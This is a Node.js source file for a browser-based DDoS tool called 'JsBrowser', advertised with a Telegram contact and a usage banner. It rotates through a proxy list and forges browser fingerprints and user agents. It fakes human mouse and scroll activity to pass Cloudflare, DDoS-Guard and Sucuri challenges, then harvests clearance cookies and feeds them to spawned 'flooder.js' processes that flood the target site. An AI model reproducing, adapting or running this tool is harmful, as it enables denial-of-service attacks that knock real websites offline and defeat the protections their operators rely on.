const { connect } = require('puppeteer-real-browser');
const { FingerprintGenerator } = require('fingerprint-generator');
const { FingerprintInjector } = require('fingerprint-injector');
const timers = require('timers/promises');
const { spawn } = require('child_process');
const fs = require('fs');
const cluster = require('cluster');
const colors = require('colors');

process.on("uncaughtException", function (error) {
  console.log(error)
});

process.on("unhandledRejection", function (error) {
  console.log(error)
});

process.setMaxListeners(0);

if (process.argv.length < 7) {
  console.clear();
  console.log(`
  Contact:
       Telegram: t.me/bixd08 - JsBrowser

  Usage:
       node browser.mjs (target) (time) (thread) (rate) (proxyfile)

  Options:
       --debug           - enable debug mode (default: false)
       --headless       - enable graphical mode (default: false)
       --auth              - proxy with credentials ip:port:user:pass (default: false)
       --fingerprint   - enable fingerprint creation (default: true)
       --threads         - flooder threads (default: 1)
       --cookies          - cookie collection iterations (default: 0)
       --flooder           - enable flood process (default: false)
       --randmethod  - random HTTP method (default: false)

`);
  process.exit(0)
};

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
var rate = parseInt(process.argv[5]);
const proxyfile = process.argv[6];
let usedProxies = {}

// ============ PROXY HEALTH TRACKING ============
const proxyHealth = {};

function updateProxyHealth(proxy, success, responseTime = 0) {
  if (!proxyHealth[proxy]) {
    proxyHealth[proxy] = { success: 0, fail: 0, avgTime: 0, score: 1.0 };
  }

  if (success) {
    proxyHealth[proxy].success++;
    proxyHealth[proxy].avgTime = (proxyHealth[proxy].avgTime * 0.7) + (responseTime * 0.3);
  } else {
    proxyHealth[proxy].fail++;
  }

  const successRate = proxyHealth[proxy].success / (proxyHealth[proxy].success + proxyHealth[proxy].fail + 1);
  proxyHealth[proxy].score = successRate;
}

function error(msg) {
  console.log(` ${'['.red}${'error'.bold}${']'.red} ${msg}`)
  process.exit(0)
}

function get_option(flag) {
  const index = process.argv.indexOf(flag);
  return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

function exit() {
  for (const flooder of flooders) {
    flooder.kill();
  }
  log(1, `${'End!'.bold}`);
  process.exit(0);
}

process.on('SIGTERM', () => {
  exit();
}).on('SIGINT', () => {
  exit();
});

const options = [
  { flag: '--debug', value: get_option('--debug'), default: false },
  { flag: '--headless', value: get_option('--headless'), default: false },
  { flag: '--auth', value: get_option('--auth'), default: false },
  { flag: '--rate', value: get_option('--rate'), default: false },
  { flag: '--fingerprint', value: get_option('--fingerprint'), default: true },
  { flag: '--threads', value: get_option('--threads'), default: 1 },
  { flag: '--cookies', value: get_option('--cookies'), default: 0 },
  { flag: '--flooder', value: get_option('--flooder'), default: false },
  { flag: '--randmethod', value: get_option('--randmethod'), default: false },
];

function enabled(buf) {
  var flag = `--${buf}`;
  const option = options.find(option => option.flag === flag);
  if (option === undefined) {
    return false;
  }

  const optionValue = option.value;
  if (option.value === undefined && option.default) {
    return option.default;
  }

  if (optionValue === "true" || optionValue === true) {
    return true;
  } else if (optionValue === "false" || optionValue === false) {
    return false;
  } else if (!isNaN(optionValue)) {
    return parseInt(optionValue);
  } else {
    return false;
  }
}

if (!proxyfile) { error("Invalid proxy file!") }
if (!target || !target.startsWith('https://')) { error("Invalid target address (https only)!") }
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!") }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!") }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!") }

const raw_proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
if (raw_proxies.length <= 0) { error("Proxy file is empty!") }

var parsed = new URL(target);

function shuffle_proxies(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

const proxies = shuffle_proxies(raw_proxies);
var headless = enabled('headless');
headless = headless ? true : !headless ? false : true;
var debug = enabled('debug');
debug = debug ? true : !debug ? false : true;
var cookiesOpt = enabled('cookies');
var flooderOpt = enabled('flooder');
var randMethodOpt = enabled('randmethod');

const cache = [];
const flooders = [];

function log(type, string) {
  let script;
  switch (type) {
    case 1:
      script = "JsBrowser";
      break;
    case 2:
      script = "JsFlooder";
      break;
    default:
      script = "Status";
      break;
  }

  let d = new Date();
  let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
  let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
  let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

  if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
    hours = "undefined";
    minutes = "undefined";
    seconds = "undefined";
  }

  if (enabled('debug')) {
    console.log(`(${`${hours}:${minutes}:${seconds}`.cyan}) [${colors.magenta.bold(script)}] | ${string}`);
  }
}

function random_int(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ============ ENHANCED HUMAN BEHAVIOR SIMULATION ============
async function simulateHumanBehavior(page) {
  try {
    const actions = random_int(2, 4);

    for (let i = 0; i < actions; i++) {
      const actionType = random_int(1, 3);

      if (actionType === 1) {
        // Mouse movement
        const x = random_int(100, 800);
        const y = random_int(100, 600);
        await page.mouse.move(x, y, { steps: random_int(5, 15) });
      } else if (actionType === 2) {
        // Scroll
        await page.evaluate(() => {
          window.scrollBy(0, Math.random() * 300);
        });
      } else {
        // Random pause
        await timers.setTimeout(random_int(100, 500));
      }

      await timers.setTimeout(random_int(200, 800));
    }
  } catch (err) {
    // Ignore errors
  }
}

// ============ ENHANCED COOKIE VALIDATION ============
function validateCookie(cookie) {
  if (!cookie) return false;

  const cfClearance = cookie.split('cf_clearance=')[1]?.split(';')[0];
  const cfBM = cookie.split('__cf_bm=')[1]?.split(';')[0];

  if (cfClearance) {
    if (cfClearance.length < 10) return false;

    // Check entropy
    const uniqueChars = new Set(cfClearance).size;
    if (uniqueChars < 8) return false; // Too predictable

    return true;
  }

  if (cfBM) {
    if (cfBM.length < 10) return false;
    return true;
  }

  return false;
}

async function flooder(headers, proxy, ua, cookie) {
  var THREADS = 1;
  const flooder_threads = enabled('threads');
  if (flooder_threads && !isNaN(flooder_threads) && typeof flooder_threads !== 'boolean') {
    THREADS = flooder_threads;
  }

  if (cookie.includes('cf_clearance') && rate > 90) {
    rate = 90;
  }

  const args = [
    "flooder.js",
    "GET",
    target,
    duration,
    THREADS,
    rate,
    proxy,
    `${cookie}`,
    `${ua}`,
     "--full"
  ];

  if (randMethodOpt) {
    args.push('--randmethod');
  }

  if (flooderOpt) {
    const flooder_process = spawn("node", args, { stdio: 'pipe' });
    flooders.push(flooder_process);

    flooder_process.stdout.on('data', (data) => {
      const output = data.toString().split('\n').filter(line => line.trim() !== '').join('\n');
      if (output.includes('Restart Browser')) {
        log(2, "Restarting Browser".bold);
        if (cache.length > 0) {
          const random_index = Math.floor(Math.random() * cache.length);
          const item = cache[random_index];
          flooder(undefined, item["proxy"], item["ua"], item["cookie"]);
          cache.splice(random_index, 1);
        } else {
          main();
        }
        return;
      }
    });

    flooder_process.stderr.on('data', (data) => {
      flooder_process.kill();
    });

    flooder_process.on('error', (err) => {
      flooder_process.kill();
    });

    flooder_process.on('close', (code) => {
      flooder_process.kill();
    });
  }
}

async function sleep(duration) {
  await new Promise(resolve => setTimeout(resolve, duration));
}

// ============ ENHANCED CHALLENGE DETECTION ============
async function isChallengeSolved(page, protections) {
  try {
    const title = await page.title();
    if (title && protections.some(p => title.toLowerCase().includes(p))) {
      return false;
    }

    const isSolved = await page.evaluate(() => {
      return document.readyState === 'complete' &&
        !document.body.innerHTML.includes('Just a moment') &&
        !document.body.querySelector('.cf-browser-verification') &&
        !document.body.querySelector('[data-ray]') &&
        !document.body.querySelector('#challenge-running') &&
        !document.body.querySelector('.antibot-container') &&
        document.body.children.length > 0;
    });

    const cookiesCheck = await page.evaluate(() => {
      const cfClearance = document.cookie.split(';').find(row => row.startsWith('cf_clearance='));
      const cfBM = document.cookie.split(';').find(row => row.startsWith('__cf_bm='));
      return (cfClearance && cfClearance.split('=')[1] && cfClearance.split('=')[1].length > 10) ||
             (cfBM && cfBM.split('=')[1] && cfBM.split('=')[1].length > 10);
    });

    return isSolved && cookiesCheck;
  } catch (err) {
    return false;
  }
}

async function main(reserve) {
  return new Promise(async (resolve) => {
    let proxy = proxies[~~(Math.random() * (proxies.length))];

    while (usedProxies[proxy]) {
      if (Object.keys(usedProxies).length == proxies.length) {
        usedProxies = {};
        return;
      }
      proxy = proxies[~~(Math.random() * (proxies.length))];
    }

    usedProxies[proxy] = true;
    let [proxy_host, proxy_port] = proxy.split(':');
    let Browser, Page;
    const startTime = Date.now();

    if(enabled('debug')) {
      console.log(`Start chrome run with addressProxy: ${colors.magenta(`${proxy_host}:${proxy_port}`)}`);}

    try {
      let proxy_plugin = {
        host: proxy_host,
        port: proxy_port
      }

      if (enabled('auth')) {
        let [host, port, username, password] = proxy.split(':');
        proxy_plugin = {
          host: host,
          port: parseInt(port),
          username: username,
          password: password
        }
      }

      let { page, browser } = await connect({
        turnstile: true,
        headless: headless,
        args: [],
        customConfig: {},
        connectOption: {},
        connectTimeout: 60000,
        ignoreAllFlags: false,
        proxy: proxy_plugin
      }).catch((err) => {
        console.log("error encountered !", err);
        updateProxyHealth(proxy, false);
        return main();
      })

      Browser = browser;
      Page = page;

      // ============ ENHANCED FINGERPRINT GENERATION ============
      if (enabled('fingerprint')) {
        const fingerprintInjector = new FingerprintInjector();
        const fingerprintGenerator = new FingerprintGenerator({
          devices: ['desktop'],
          operatingSystems: ['windows']
        });

        const fingerprint = fingerprintGenerator.getFingerprint();

        // Enhanced User-Agent pool with more variations
        const newUA = [
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0'
        ];

        const randomIndex = Math.floor(Math.random() * newUA.length);
        fingerprint.headers['User-Agent'] = newUA[randomIndex];

        // Set random viewport
        const viewports = [
          { width: 1920, height: 1080 },
          { width: 1366, height: 768 },
          { width: 2560, height: 1440 },
          { width: 1536, height: 864 }
        ];
        const randomViewport = viewports[Math.floor(Math.random() * viewports.length)];
        await page.setViewport({
          width: randomViewport.width,
          height: randomViewport.height,
          deviceScaleFactor: Math.random() > 0.5 ? 1 : 2
        });
      }

      var userAgent = await page.evaluate(() => {
        return navigator.userAgent;
      });

      if (userAgent.includes("Headless")) {
        userAgent = userAgent.replace('Headless', '');
        await page.setUserAgent(userAgent);
      }

      // Simulate human behavior before navigation
      await timers.setTimeout(random_int(500, 1500));

      await page.goto(target, { waitUntil: 'networkidle0', timeout: 30000 });

      // Simulate human interaction after page load
      await simulateHumanBehavior(page);

      let titles = [];
      let protections = [
        'just a moment...',
        'ddos-guard',
        '403 forbidden',
        'security check',
        'One more step',
        'Sucuri WebSite Firewall',
        'checking your browser',
        'enable javascript'
      ];

      const maxWaitTime = 30000;
      const pollInterval = 250;

      const titleCheckPromise = new Promise((resolve, reject) => {
        let pollCount = 0;
        const poll = async () => {
          pollCount++;
          try {
            const solved = await isChallengeSolved(page, protections);
            if (solved) {
              clearInterval(interval);
              resolve(true);
              return;
            }

            const title = await page.title();
            if (title.startsWith("Failed to load URL ")) {
              clearInterval(interval);
              reject(new Error("Failed to load URL"));
              return;
            }

            if (!title) {
              titles.push(parsed.hostname);
              clearInterval(interval);
              resolve(true);
              return;
            }

            if (title !== titles[titles.length - 1]) {
              log(1, `(${colors.magenta(proxy)}) ${colors.bold('Title')}: ${colors.italic(title)}`);
            }

            titles.push(title);

            if (!protections.some(p => title.toLowerCase().includes(p))) {
              clearInterval(interval);
              resolve(true);
              return;
            }

          } catch (err) {
            if (pollCount >= 5) {
              log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: ${colors.italic('Too many errors!')}`);
              clearInterval(interval);
              reject(err);
              return;
            }
          };
        };

        const interval = setInterval(poll, pollInterval);
        poll();

        setTimeout(() => {
          clearInterval(interval);
          reject(new Error("Timeout waiting for challenge solve"));
        }, maxWaitTime);
      });

      try {
        await titleCheckPromise;
        log(1, `(${colors.magenta(proxy)}) ${colors.bold('Challenge solved')}`);
      } catch (err) {
        log(1, `(${colors.magenta(proxy)}) ${colors.bold('Challenge failed')}: ${err.message}`);
        await page.close();
        await browser.close();
        delete usedProxies[proxy];
        updateProxyHealth(proxy, false);
        return main(reserve);
      }

      await timers.setTimeout(random_int(1000, 2000));

      var cookies = await page.cookies();
      const _cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");

      // Enhanced cookie validation
      if (!validateCookie(_cookie)) {
        log(1, `(${colors.magenta(proxy)}) ${colors.bold('Invalid cookie')}: Failed validation`);
        await page.close();
        await browser.close();
        updateProxyHealth(proxy, false);
        return main(reserve);
      }

      const responseTime = Date.now() - startTime;
      updateProxyHealth(proxy, true, responseTime);

      log(1, `(${colors.magenta(proxy)}) ${colors.bold('Cookie')}: ${colors.green(_cookie)}`);
      log(1, `(${colors.magenta(proxy)}) ${colors.bold('Score')}: ${proxyHealth[proxy]?.score.toFixed(2) || 'N/A'} | ${colors.bold('Time')}: ${responseTime}ms`);

      await page.close();
      await browser.close();

      if (!reserve) {
        flooder(undefined, proxy, userAgent, _cookie);
      } else {
        cache.push({
          proxy: proxy,
          ua: userAgent,
          cookie: _cookie
        })
      }

      resolve();
    } catch (err) {
      if (enabled('debug')) {
        log(1, `Error: ${err.message}`);
      }

      if (Page) {
        await Page.close()
      }

      if (Browser) {
        await Browser.close()
      }

      delete usedProxies[proxy];
      updateProxyHealth(proxy, false);
      main(reserve);
      resolve();
    }
  })
}

if (cluster.isPrimary) {
  setTimeout(() => {
    exit()
  }, Number(duration) * 1000)

  for (let i = 0; i < threads; i++) {
    main(false)
  }

  if (!isNaN(cookiesOpt) && typeof cookiesOpt !== 'boolean') {
    var x = 1;
    const cookie_interval = setInterval(() => {
      x++;
      if (x >= cookiesOpt) { clearInterval(cookie_interval) }
      main(true)
    }, 3000);
  }
}
